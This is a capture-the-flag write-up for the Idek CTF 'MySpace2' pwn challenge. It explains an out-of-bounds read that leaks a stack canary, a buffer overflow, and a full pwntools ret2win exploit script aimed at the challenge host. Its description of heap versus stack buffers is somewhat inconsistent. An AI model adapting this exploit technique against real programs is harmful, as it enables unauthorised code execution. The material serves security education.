---
title: "Idek CTF - MySpace2 PWN Writeup"
date: 2025-09-12T00:00:00+00:00
lastmod: 2025-09-12T00:00:00+00:00
tags: ["PWN", "OOB", "Buffer-Overflow", "Canary"]
categories: ["IdekCtf"]
cover: "images/cover_images/space.jpg"
---

# MySpace2 - Idek CTF

## Challenge Description

```

I miss MySpace. Ranking my friends publicly is goated. I decided to bring it back, with new security 
features so we can all win!

````

This binary is a 64-bit ELF executable with the following protections:

```sh
➜  checksec myspace2
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x400000)
Stripped:   No
Debuginfo:  Yes
````

We can see that **PIE is disabled**, the stack has a **canary**, and NX appears to be missing.

## Initial Analysis

The binary exposes several functions:

```c
void all_friends(char (*)[8]);
void display_friend(char (*)[8]);
void edit_friend(char (*)[8]);
void get_flag();
void ignore_me();
int main();
void menu();
```

After analyzing the functions, the most relevant ones are `display_friend` and `edit_friend`.

---

### `display_friend`

This function allows us to select a friend index from `0` to `7`. However, the **index validation is weak**. If we input an out-of-bounds index (e.g., `100`), the program prints an error but still accesses memory at `base + index*8`. This creates a **read out-of-bounds vulnerability**, which we can later leverage to leak the stack canary.

---

### `edit_friend`

The `edit_friend` function allows editing a friend's name. The important part of the code:

```c
char *friends[8];  // each entry points to a 32-byte buffer

for (int i = 0; i < 8; i++) {
    friends[i] = malloc(32);
}
```

The program uses `fgets` to read up to `256` bytes:

```c
fgets(friends[0], 0x100, stdin);
```

This clearly leads to a **buffer overflow**. Initially, the canary may seem to prevent exploitation, but using the weak validation in `display_friend`, we can leak the canary value from the stack.

---

### Leaking the Canary

By examining the stack at the return of `edit_friend`, we can identify the canary's location:

```sh
pwndbg> x/40gx $rsp
...
0x7fffffffde88: 0x6e625af2170ce400  <- likely stack canary
...
```

Using `display_friend` with an out-of-bounds index (specifically, index 13) allows us to reliably read the stack canary. When editing friend #7, the canary is located approximately 48 bytes into the buffer. Once we have the canary, we can safely construct an exploit bypassing stack protection.

---

## Exploit Strategy

The challenge is essentially a **ret2win**:

1. Leak the **stack canary** using `display_friend`.
2. Overflow the buffer in `edit_friend` while preserving the canary.
3. Overwrite the return address with the address of `get_flag()`.

---

## Exploit Code

```python
from pwn import *

#io = process('./myspace2')
io = remote('myspace2.chal.idek.team',1337)

get_flag = p64(0x40129d)
offset1 = b'A' * 48

# Leak the canary
io.sendlineafter(b'>>', b'3')
io.sendlineafter(b':', b'13')
leak = io.recvuntil(b'\n1. See Top Friends')
canary_line = leak.split(b'\n')[-2]

canary = canary_line[:8]
canary = u64(canary.ljust(8, b'\x00'))  # Convert to integer (little-endian)
canary_packed = p64(canary)   

log.success(f"Canary: {canary_packed.hex()}")

# Build payload
payload = offset1 + canary_packed + b"A"* 8 + get_flag
io.sendlineafter(b'>>', b'2')
io.sendlineafter(b':', b'7')
io.sendlineafter(b':', payload)
io.sendlineafter(b'>>', b'4')

io.interactive()
```

Running Exploit:

{{< figure src="/images/posts_images/idekctf/run_exploit.png" alt="exploit output" >}}


---

## Conclusion

This challenge highlights:

* **Out-of-bounds reads** can be leveraged to leak stack canaries.
* **Heap-allocated buffers** combined with improper bounds checking can lead to buffer overflows.
* Careful analysis of binary protections is essential to craft a reliable exploit.

This was a clean example of bypassing stack canaries to achieve a ret2win exploit in a CTF scenario.

If you notice any inaccuracies or mistakes in this writeup, please feel free to contact me. I’d be happy to clarify or correct any information.


